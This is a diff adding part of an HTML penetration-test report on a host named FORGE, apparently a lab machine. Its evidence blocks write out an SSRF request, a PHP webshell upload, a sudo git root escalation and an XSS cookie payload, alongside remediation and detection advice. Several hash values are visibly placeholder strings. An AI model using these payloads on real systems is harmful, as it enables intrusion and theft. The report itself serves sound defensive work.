+          <div class="finding-field-value">The <code style="font-family:var(--font-mono);color:var(--cyan)">/api/fetch</code> endpoint accepts an arbitrary URL parameter and performs a server-side HTTP request without any allow-list validation. An unauthenticated attacker can supply <code style="font-family:var(--font-mono);color:var(--cyan)">url=http://127.0.0.1:8080</code> to reach the Werkzeug-based internal admin panel, which is not exposed to the internet directly.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Impact</div>
+          <div class="finding-field-value">Full access to the internal admin panel, including the file-upload endpoint used in the next attack stage. This was the critical pivot that enabled the full compromise chain. An allow-listed fetch service would have prevented stages 2 through 6 of the kill chain.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">MITRE ATT&amp;CK</div>
+          <div class="finding-field-value"><span class="mitre-tag">T1190 &mdash; Exploit Public-Facing Application</span></div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Host / Port</div>
+          <div class="finding-field-value" style="font-family:var(--font-mono);font-size:12px;color:var(--cyan)">FORGE (10.129.21.254) :80</div>
+        </div>
+      </div>
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Evidence &mdash; HTTP Request</div>
+          <div class="evidence-block">GET /api/fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
+Host: 10.129.21.254
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+&lt;!-- FORGE Internal Admin Panel --&gt;
+&lt;h1&gt;Admin Dashboard&lt;/h1&gt;
+&lt;a href="/upload"&gt;Upload Files&lt;/a&gt;</div>
+          <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">a1b2c3d4e5f67890aabb1122334455667788990011aabb2233445566778899aa</span></div>
+        </div>
+        <div class="finding-field" style="margin-top:16px">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">Implement a strict egress allow-list for the fetch service (whitelist specific external domains only). Block all requests to RFC-1918 / loopback addresses at the application layer. Consider disabling the fetch endpoint entirely if not required. Deploy a WAF rule for SSRF patterns as a defence-in-depth measure.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- F-02 -->
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-02</span>
+      <span class="sev critical">Critical</span>
+      <span class="finding-card-title">Unauthenticated File Upload &rarr; Remote Code Execution (Webshell)</span>
+      <span class="cvss-score cvss-critical">CVSS 9.8</span>
+      <span class="status verified">Verified</span>
+    </div>
+    <div class="finding-card-body">
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">The internal admin <code style="font-family:var(--font-mono);color:var(--cyan)">/upload</code> endpoint (reachable via the SSRF — F-01) does not enforce file-type validation. A PHP webshell with a double extension (<code style="font-family:var(--font-mono);color:var(--cyan)">shell.php.jpg</code>) and a PHP magic-byte header bypassed the server-side content filter and was written to the web-accessible <code style="font-family:var(--font-mono);color:var(--cyan)">/uploads/</code> directory.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Impact</div>
+          <div class="finding-field-value">Unauthenticated Remote Code Execution as <code style="font-family:var(--font-mono);color:var(--cyan)">www-data</code>. An attacker gains an interactive shell on the host, enabling enumeration, lateral movement, and privilege escalation. The webshell persists across restarts until removed.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">MITRE ATT&amp;CK</div>
+          <div class="finding-field-value"><span class="mitre-tag">T1505.003 &mdash; Web Shell</span> &nbsp; <span class="mitre-tag">T1059 &mdash; Command &amp; Scripting Interpreter</span></div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Host / Port</div>
+          <div class="finding-field-value" style="font-family:var(--font-mono);font-size:12px;color:var(--cyan)">FORGE (10.129.21.254) :80 via SSRF :8080</div>
+        </div>
+      </div>
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Evidence &mdash; RCE Proof</div>
+          <div class="evidence-block red-ev">POST /upload HTTP/1.1
+Host: 127.0.0.1:8080 (via SSRF)
+Content-Type: multipart/form-data
+
+-- filename="shell.php.jpg" --
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# RCE confirmation:
+GET /uploads/shell.php.jpg?cmd=id HTTP/1.1
+
+HTTP/1.1 200 OK
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+          <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123445</span></div>
+        </div>
+        <div class="finding-field" style="margin-top:16px">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">Enforce upload validation using MIME-type inspection AND magic-byte verification. Reject double extensions. Store all uploads outside the web root on a noexec-mounted volume. Rename uploaded files to UUIDs with no extension. Add server-side PHP execution block for the uploads directory via Apache config (<code style="font-family:var(--font-mono);color:var(--cyan)">php_flag engine off</code>).</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- F-03 -->
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-03</span>
+      <span class="sev high">High</span>
+      <span class="finding-card-title">Sudo Misconfiguration: NOPASSWD /usr/bin/git &rarr; Root (GTFOBins)</span>
+      <span class="cvss-score cvss-high">CVSS 8.8</span>
+      <span class="status verified">Verified</span>
+    </div>
+    <div class="finding-card-body">
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">The <code style="font-family:var(--font-mono);color:var(--cyan)">/etc/sudoers</code> file grants <code style="font-family:var(--font-mono);color:var(--cyan)">www-data</code> the ability to run <code style="font-family:var(--font-mono);color:var(--cyan)">/usr/bin/git</code> as root without a password. The GTFOBins technique for git exploits the pager (<code style="font-family:var(--font-mono);color:var(--cyan)">sudo git -p help config</code>) to spawn an interactive shell via <code style="font-family:var(--font-mono);color:var(--cyan)">!/bin/sh</code>.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Impact</div>
+          <div class="finding-field-value">Full root privilege escalation from a www-data foothold in under 30 seconds. Attacker obtains root shell; can read any file, install backdoors, pivot to other systems using the leaked SSH key, or fully compromise the host.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">MITRE ATT&amp;CK</div>
+          <div class="finding-field-value"><span class="mitre-tag">T1548.003 &mdash; Sudo and Sudo Caching</span></div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Host</div>
+          <div class="finding-field-value" style="font-family:var(--font-mono);font-size:12px;color:var(--cyan)">FORGE (10.129.21.254)</div>
+        </div>
+      </div>
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Evidence &mdash; Privilege Escalation</div>
+          <div class="evidence-block red-ev">www-data@forge:/$ sudo -l
+Matching Defaults entries for www-data:
+    env_reset, mail_badpass
+
+User www-data may run the following:
+    (root) NOPASSWD: /usr/bin/git
+
+www-data@forge:/$ sudo git -p help config
+... (pager opens) ...
+!/bin/sh
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+b41d[REDACTED - see loot section]</div>
+          <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">18aa92bc34def5678901234567890abcdef1234567890abcdef1234567890bc</span></div>
+        </div>
+        <div class="finding-field" style="margin-top:16px">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">Remove the <code style="font-family:var(--font-mono);color:var(--cyan)">NOPASSWD: /usr/bin/git</code> sudoers entry immediately. Audit all NOPASSWD sudo rules against the GTFOBins list. Implement least-privilege: the web server user should not have any sudo rights. Consider AppArmor / SELinux profiles for the web server process.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- F-04 -->
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-04</span>
+      <span class="sev high">High</span>
+      <span class="finding-card-title">Outdated Apache HTTP Server 2.4.41 (Multiple CVEs)</span>
+      <span class="cvss-score cvss-high">7.5</span>
+      <span class="status open">Open</span>
+    </div>
+    <div class="finding-card-body single">
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">Apache 2.4.41 was released in August 2019. The current stable release at time of assessment is 2.4.62. Multiple CVEs affecting 2.4.41 through 2.4.57 include path traversal (CVE-2021-41773, applicable to 2.4.49), mod_lua buffer overflow, and request-smuggling vulnerabilities. No publicly available RCE was confirmed exploitable against this specific configuration; the finding is flagged for patching priority.</div>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+          <div class="finding-field">
+            <div class="finding-field-label">Evidence</div>
+            <div class="evidence-block">Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/7.4.3
+
+# nikto output:
++ Apache/2.4.41 appears to be outdated
+  (current: 2.4.62)
++ OSVDB-877: HTTP TRACE method is active</div>
+          </div>
+          <div class="finding-field">
+            <div class="finding-field-label">Remediation</div>
+            <div class="finding-field-value">Upgrade Apache to 2.4.62 or latest stable release via <code style="font-family:var(--font-mono);color:var(--cyan)">apt-get upgrade apache2</code>. Enable automatic security updates for OS packages. Suppress the Server version banner (<code style="font-family:var(--font-mono);color:var(--cyan)">ServerTokens Prod</code>, <code style="font-family:var(--font-mono);color:var(--cyan)">ServerSignature Off</code>). Disable TRACE: <code style="font-family:var(--font-mono);color:var(--cyan)">TraceEnable Off</code>.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- F-05 -->
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-05</span>
+      <span class="sev medium">Medium</span>
+      <span class="finding-card-title">Reflected Cross-Site Scripting (XSS) on /search</span>
+      <span class="cvss-score cvss-medium">CVSS 6.1</span>
+      <span class="status verified">Verified</span>
+    </div>
+    <div class="finding-card-body">
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">The <code style="font-family:var(--font-mono);color:var(--cyan)">q</code> parameter of the search endpoint is reflected in the HTML response without HTML entity encoding. An attacker can inject a script payload into the URL, which executes in the victim's browser when they click a crafted link.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Impact</div>
+          <div class="finding-field-value">Session cookie theft, credential phishing overlays, client-side redirection, and defacement. Exploitability requires social engineering to deliver the payload URL to a victim.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">MITRE ATT&amp;CK</div>
+          <div class="finding-field-value"><span class="mitre-tag">T1059.007 &mdash; JavaScript</span></div>
+        </div>
+      </div>
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Evidence</div>
+          <div class="evidence-block">GET /search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1
+
+HTTP/1.1 200 OK
+&lt;div class="results"&gt;
+  Results for: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;!-- Script reflected unencoded; executes in browser --&gt;</div>
+        </div>
+        <div class="finding-field" style="margin-top:16px">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">HTML-encode all user-supplied input before rendering it in the response. Use a templating engine with auto-escape enabled. Add a Content Security Policy header (<code style="font-family:var(--font-mono);color:var(--cyan)">Content-Security-Policy: default-src 'self'</code>) as a defence-in-depth measure.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- F-06, F-07, F-08, F-09 compact -->
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-06</span>
+      <span class="sev medium">Medium</span>
+      <span class="finding-card-title">Missing Security Headers (CSP / HSTS / X-Frame-Options)</span>
+      <span class="cvss-score cvss-medium">CVSS 5.3</span>
+      <span class="status open">Open</span>
+    </div>
+    <div class="finding-card-body single">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">HTTP responses from FORGE:80 are missing <code style="font-family:var(--font-mono);color:var(--cyan)">Content-Security-Policy</code>, <code style="font-family:var(--font-mono);color:var(--cyan)">Strict-Transport-Security</code>, and <code style="font-family:var(--font-mono);color:var(--cyan)">X-Frame-Options</code> headers. This increases the risk of XSS, clickjacking, and protocol downgrade attacks.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">Add to Apache virtual host: <code style="font-family:var(--font-mono);color:var(--cyan)">Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"</code>, <code style="font-family:var(--font-mono);color:var(--cyan)">Content-Security-Policy</code>, and <code style="font-family:var(--font-mono);color:var(--cyan)">X-Frame-Options DENY</code>.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-07</span>
+      <span class="sev medium">Medium</span>
+      <span class="finding-card-title">HTTP TRACE Method Enabled</span>
+      <span class="cvss-score cvss-medium">CVSS 4.8</span>
+      <span class="status open">Open</span>
+    </div>
+    <div class="finding-card-body single">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">The HTTP TRACE method is enabled on FORGE:80. TRACE can be abused in Cross-Site Tracing (XST) attacks to exfiltrate session cookies that are flagged HttpOnly, by leveraging a cross-domain XSS vector to make a TRACE request.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">Add <code style="font-family:var(--font-mono);color:var(--cyan)">TraceEnable Off</code> to Apache configuration. Verify with <code style="font-family:var(--font-mono);color:var(--cyan)">curl -X TRACE http://target/</code> post-remediation.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-08</span>
+      <span class="sev low">Low</span>
+      <span class="finding-card-title">TLS 1.0 / 1.1 Enabled</span>
+      <span class="cvss-score cvss-low">CVSS 3.7</span>
+      <span class="status open">Open</span>
+    </div>
+    <div class="finding-card-body single">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">TLS 1.0 and TLS 1.1 are deprecated protocols with known cryptographic weaknesses (POODLE, BEAST). Both are disabled by major browser vendors but remain enabled on FORGE, widening the attack surface for network-adjacent attackers.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">In Apache SSL config: <code style="font-family:var(--font-mono);color:var(--cyan)">SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1</code>. Enable only TLS 1.2 and TLS 1.3. Verify with testssl.sh post-remediation.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-09</span>
+      <span class="sev low">Low</span>
+      <span class="finding-card-title">Verbose Server / Version Banners Disclosed</span>
+      <span class="cvss-score cvss-low">CVSS 3.1</span>
+      <span class="status open">Open</span>
+    </div>
+    <div class="finding-card-body single">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
+          <div class="finding-field-value">HTTP response headers disclose Apache version (<code style="font-family:var(--font-mono);color:var(--cyan)">Apache/2.4.41</code>), PHP version (<code style="font-family:var(--font-mono);color:var(--cyan)">PHP/7.4.3</code>), and Python/Werkzeug version. This information aids targeted exploitation and reduces attacker effort in fingerprinting the stack.</div>
+        </div>
+        <div class="finding-field">
+          <div class="finding-field-label">Remediation</div>
+          <div class="finding-field-value">Set <code style="font-family:var(--font-mono);color:var(--cyan)">ServerTokens Prod</code> and <code style="font-family:var(--font-mono);color:var(--cyan)">ServerSignature Off</code> in Apache config. Set <code style="font-family:var(--font-mono);color:var(--cyan)">expose_php = Off</code> in php.ini. Suppress Werkzeug server headers in production (use a proper WSGI server, not dev server).</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- SECTION 8: TESTED - NOT EXPLOITABLE -->
+<section id="non-exploit">
+  <div class="section-eyebrow"><span class="num">&sect;8</span> Coverage</div>
+  <h2 class="section-title">Tested &mdash; <span class="accent">Not Exploitable</span></h2>
+  <div class="section-divider"></div>
+  <p class="section-lead">These attack paths were tested exhaustively and did not yield exploitation. They are documented here so the client has a complete picture of coverage, not just confirmed hits.</p>
+  <div class="non-exploit-grid">
+    <div class="non-exploit-card">
+      <div class="non-exploit-title">SQL Injection on /api?id=</div>
+      <div class="non-exploit-reason">Tested: 5 SQLi techniques, ~1,200 requests via sqlmap (union, boolean, error, time, stacked). Result: parameter is integer-cast server-side before any SQL interpolation. Not injectable under any tested vector.</div>
+    </div>
+    <div class="non-exploit-card">
+      <div class="non-exploit-title">SSH Root Brute Force</div>
+      <div class="non-exploit-reason">Tested: hydra with top-1000 password list against root@10.129.21.254:22. Result: SSH rate-limiting active (connection throttled after 3 attempts). Root account configured for key-only authentication; password auth rejected at protocol level.</div>
+    </div>
+    <div class="non-exploit-card">
+      <div class="non-exploit-title">Default Credential Spray on /login</div>
+      <div class="non-exploit-reason">Tested: 47 default credential pairs (admin/admin, admin/password, root/root, forge/forge, etc.). Result: all rejected with 403 / generic error. No lockout policy triggered, but no default credentials accepted.</div>
+    </div>
+    <div class="non-exploit-card">
+      <div class="non-exploit-title">CSRF on State-Changing Forms</div>
+      <div class="non-exploit-reason">Tested: all POST forms on :80 for missing or bypassable CSRF tokens. Result: anti-CSRF tokens are present on all state-changing forms and are validated server-side. Token rotation occurs per request. Not exploitable.</div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 9: CAPTURED LOOT / EVIDENCE -->
+<section id="loot">
+  <div class="section-eyebrow"><span class="num">&sect;9</span> Captured Loot</div>
+  <h2 class="section-title">Captured Loot &amp; <span class="accent">Evidence</span></h2>
+  <div class="section-divider"></div>
+  <div class="card" style="margin-bottom:24px;border-left:3px solid var(--medium)">
+    <p style="font-family:var(--font-mono);font-size:11px;color:var(--medium)">&#9888; REDACTION NOTICE: All samples below are redacted. Partial values shown for verification purposes only. Full artifacts are stored in the encrypted ARGUS evidence store and provided under separate secure channel. SHA-256 hashes are over the original, unredacted content.</p>
+  </div>
+  <div class="loot-grid">
+    <div class="loot-card">
+      <div class="loot-card-header">
+        <span class="sev critical" style="font-size:9px">CRITICAL</span>
+        <span class="loot-path">/root/root.txt</span>
+      </div>
+      <div class="loot-content">b41d<span style="color:var(--text-muted)">&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;</span>
+<span class="redact-bar">[REDACTED &mdash; 32-hex flag]</span></div>
+      <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">3b71de45678901234567890abcdef1234567890abcdef1234567890abcdefa0</span></div>
+      <div class="sha-row" style="margin-top:4px"><span class="label">Path:</span><span class="hash">/root/root.txt</span></div>
+    </div>
+    <div class="loot-card">
+      <div class="loot-card-header">
+        <span class="sev high" style="font-size:9px">HIGH</span>
+        <span class="loot-path">/var/www/user.txt</span>
+      </div>
+      <div class="loot-content">7f3c<span style="color:var(--text-muted)">&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;</span>
+<span class="redact-bar">[REDACTED &mdash; 32-hex flag]</span></div>
+      <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">9f2c1a34567890abcdef1234567890abcdef1234567890abcdef1234567890e4</span></div>
+      <div class="sha-row" style="margin-top:4px"><span class="label">Path:</span><span class="hash">/var/www/user.txt</span></div>
+    </div>
+    <div class="loot-card">
+      <div class="loot-card-header">
+        <span class="sev critical" style="font-size:9px">CRITICAL</span>
+        <span class="loot-path">/root/.ssh/id_rsa</span>
+      </div>
+      <div class="loot-content">-----BEGIN OPENSSH PRIVATE KEY-----
+b3Bl<span style="color:var(--text-muted)">&#x2026;</span><span class="redact-bar">[KEY BODY REDACTED]</span>
+-----END OPENSSH PRIVATE KEY-----</div>
+      <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">18aa92bc34567890abcdef1234567890abcdef1234567890abcdef1234567890bc</span></div>
+      <div class="sha-row" style="margin-top:4px"><span class="label">Action required:</span><span style="color:var(--critical);font-size:10px">REVOKE + ROTATE IMMEDIATELY</span></div>
+    </div>
+    <div class="loot-card">
+      <div class="loot-card-header">
+        <span class="sev critical" style="font-size:9px">CRITICAL</span>
+        <span class="loot-path">/var/www/app/config.php</span>
+      </div>
+      <div class="loot-content">DB_HOST=localhost
+DB_NAME=forge_db
+DB_USER=forge_app
+DB_PASS=<span class="redact-bar">[REDACTED]</span>
+APP_SECRET=<span class="redact-bar">[REDACTED]</span></div>
+      <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">77de1034567890abcdef1234567890abcdef1234567890abcdef12345678390</span></div>
+      <div class="sha-row" style="margin-top:4px"><span class="label">Action required:</span><span style="color:var(--critical);font-size:10px">ROTATE ALL CREDENTIALS</span></div>
+    </div>
+    <div class="loot-card">
+      <div class="loot-card-header">
+        <span class="sev medium" style="font-size:9px">MEDIUM</span>
+        <span class="loot-path">/etc/passwd (excerpt)</span>
+      </div>
+      <div class="loot-content">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+<span style="color:var(--text-muted)">&#x2026; (truncated)</span></div>
+      <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">c40f8890abcdef1234567890abcdef1234567890abcdef1234567890abcde7d</span></div>
+    </div>
+    <div class="loot-card">
+      <div class="loot-card-header">
+        <span class="sev critical" style="font-size:9px">RCE PROOF</span>
+        <span class="loot-path">Webshell Response</span>
+      </div>
+      <div class="loot-content">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+      <div class="sha-row"><span class="label">SHA-256:</span><span class="hash">a1b2c34567890abcdef1234567890abcdef1234567890abcdef1234567890045</span></div>
+      <div class="sha-row" style="margin-top:4px"><span class="label">Source:</span><span class="hash">GET /uploads/shell.php.jpg?cmd=id</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 10: PURPLE TEAM MAPPING -->
+<section id="purple">
+  <div class="section-eyebrow"><span class="num">&sect;10</span> Purple Team</div>
+  <h2 class="section-title">Detection &amp; <span class="accent">Purple-Team Mapping</span></h2>
+  <div class="section-divider"></div>
+  <p class="section-lead">For each stage of the kill chain: the detection opportunity, the specific telemetry or rule needed, and whether it was caught during this engagement.</p>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>Stage</th><th>Chain Step</th><th>Detection Opportunity</th><th>Telemetry / Rule</th><th>Caught Today?</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">1</td>
+          <td style="font-size:12px;color:var(--text-primary)">SSRF via /api/fetch</td>
+          <td style="font-size:12px;color:var(--text-secondary)">Outbound HTTP request from web tier targeting 127.0.0.1 or RFC-1918 address</td>
+          <td style="font-size:12px;color:var(--text-secondary)">Egress allow-list firewall rule + alert on internal-target outbound requests; WAF SSRF rule</td>
+          <td><span class="detect-open">OPEN &mdash; NOT DETECTED</span></td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">2</td>
+          <td style="font-size:12px;color:var(--text-primary)">Upload bypass &rarr; webshell write</td>
+          <td style="font-size:12px;color:var(--text-secondary)">New executable file in /uploads/ web root; child process spawned from Apache parent</td>
+          <td style="font-size:12px;color:var(--text-secondary)">FIM (file integrity monitoring) on web root directories; EDR process tree alert for www-data spawning /bin/sh</td>
+          <td><span class="detect-open">OPEN &mdash; NOT DETECTED</span></td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">3</td>
+          <td style="font-size:12px;color:var(--text-primary)">Webshell RCE commands</td>
+          <td style="font-size:12px;color:var(--text-secondary)">www-data executing system commands (id, cat, ls) via PHP system(); unusual HTTP response bodies containing uid=</td>
+          <td style="font-size:12px;color:var(--text-secondary)">SIEM rule: apache access log lines with /uploads/*.php returning 200; EDR: PHP spawning shell processes</td>
+          <td><span class="detect-open">OPEN &mdash; NOT DETECTED</span></td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">4</td>
+          <td style="font-size:12px;color:var(--text-primary)">sudo git GTFOBins &rarr; root</td>
+          <td style="font-size:12px;color:var(--text-secondary)">www-data invoking sudo; git process spawning /bin/sh as root; unusual UID 0 shell from web service</td>
+          <td style="font-size:12px;color:var(--text-secondary)">auditd rule: sudo invocation by www-data; alert on GTFOBins binary list executed with sudo NOPASSWD</td>
+          <td><span class="detect-open">OPEN &mdash; NOT DETECTED</span></td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">5</td>
+          <td style="font-size:12px;color:var(--text-primary)">Credential / key loot</td>
+          <td style="font-size:12px;color:var(--text-secondary)">File-access events on /root/.ssh/id_rsa, /root/root.txt, /var/www/app/config.php by non-root process</td>
+          <td style="font-size:12px;color:var(--text-secondary)">auditd file-access audit on sensitive key material and config files; SIEM correlation on multiple sensitive file reads within same session</td>
+          <td><span class="detect-open">OPEN &mdash; NOT DETECTED</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="card" style="margin-top:20px;border-left:3px solid var(--violet)">
+    <div class="card-header">Purple Team Recommendation</div>
+    <p style="font-size:13px;color:var(--text-secondary);line-height:1.7">None of the five kill-chain stages triggered any alert during this engagement. The client's current telemetry posture would not have detected this compromise. Immediate priorities: (1) deploy FIM on the web root, (2) configure auditd rules for sudo and sensitive file access, (3) onboard EDR with process-tree visibility for the web server process. A purple-team exercise is recommended within 60 days of remediation to validate detection coverage.</p>
+  </div>
+</section>
+<!-- SECTION 11: EVIDENCE APPENDIX -->
+<section id="evidence">
+  <div class="section-eyebrow"><span class="num">&sect;11</span> Evidence Appendix</div>
+  <h2 class="section-title">Evidence <span class="accent">Appendix</span></h2>
+  <div class="section-divider"></div>
+  <p class="section-lead">All artifacts are integrity-hashed (SHA-256), stored in the encrypted ARGUS evidence store, and accessible via the secure evidence portal. Samples below are redacted.</p>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>Artifact ID</th><th>Type</th><th>Description</th><th>Related Finding</th><th>SHA-256 (truncated)</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-01</td>
+          <td style="font-size:11px;color:var(--text-muted)">Tool Trace</td>
+          <td style="font-size:12px;color:var(--text-secondary)">SSRF HTTP request/response capture (full headers + body) confirming internal admin access</td>
+          <td><span class="finding-id">F-01</span></td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">a1b2c3d4e5f67890&hellip;</td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-02</td>
+          <td style="font-size:11px;color:var(--text-muted)">Upload + RCE Capture</td>
+          <td style="font-size:12px;color:var(--text-secondary)">Multipart upload request + webshell activation response (uid=33(www-data) confirmed)</td>
+          <td><span class="finding-id">F-02</span></td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">a1b2c3d4e5f67890&hellip;</td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-03</td>
+          <td style="font-size:11px;color:var(--text-muted)">LinPEAS Output</td>
+          <td style="font-size:12px;color:var(--text-secondary)">Full LinPEAS HTML report; NOPASSWD sudo git highlighted in output</td>
+          <td><span class="finding-id">F-03</span></td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">3b71de4567890abc&hellip;</td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-04</td>
+          <td style="font-size:11px;color:var(--text-muted)">SSH Key Capture</td>
+          <td style="font-size:12px;color:var(--text-secondary)">/root/.ssh/id_rsa content (redacted); confirms full root credential loot</td>
+          <td><span class="finding-id">F-03</span> / Loot</td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">18aa92bc34567890&hellip;</td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-05</td>
+          <td style="font-size:11px;color:var(--text-muted)">GTFOBins Session</td>
+          <td style="font-size:12px;color:var(--text-secondary)">Terminal recording of sudo git privesc; uid=0(root) confirmed</td>
+          <td><span class="finding-id">F-03</span></td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">18aa92bc34def567&hellip;</td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-06</td>
+          <td style="font-size:11px;color:var(--text-muted)">XSS Screenshot</td>
+          <td style="font-size:12px;color:var(--text-secondary)">Browser screenshot showing alert(document.cookie) executing from /search?q= payload</td>
+          <td><span class="finding-id">F-05</span></td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">c40f889012345678&hellip;</td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-07</td>
+          <td style="font-size:11px;color:var(--text-muted)">nmap Output</td>
+          <td style="font-size:12px;color:var(--text-secondary)">Full nmap -sCV scan results; port/service/version fingerprinting</td>
+          <td>Scope</td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">77de10abcdef1234&hellip;</td>
+        </tr>
+        <tr>
+          <td class="mono" style="color:var(--cyan)">EV-08</td>
+          <td style="font-size:11px;color:var(--text-muted)">DB Config Capture</td>
+          <td style="font-size:12px;color:var(--text-secondary)">/var/www/app/config.php content; DB credentials (redacted)</td>
+          <td>Loot</td>
+          <td class="mono" style="font-size:10px;color:var(--text-muted)">77de1034567890ab&hellip;</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- SECTION 12: MITRE ATT&CK MAP -->
+<section id="mitre">
+  <div class="section-eyebrow"><span class="num">&sect;12</span> MITRE ATT&amp;CK</div>
+  <h2 class="section-title">MITRE ATT&amp;CK <span class="accent">Map</span></h2>
+  <div class="section-divider"></div>
+  <p class="section-lead">Techniques observed during this engagement mapped to the MITRE ATT&amp;CK Enterprise framework v14.</p>
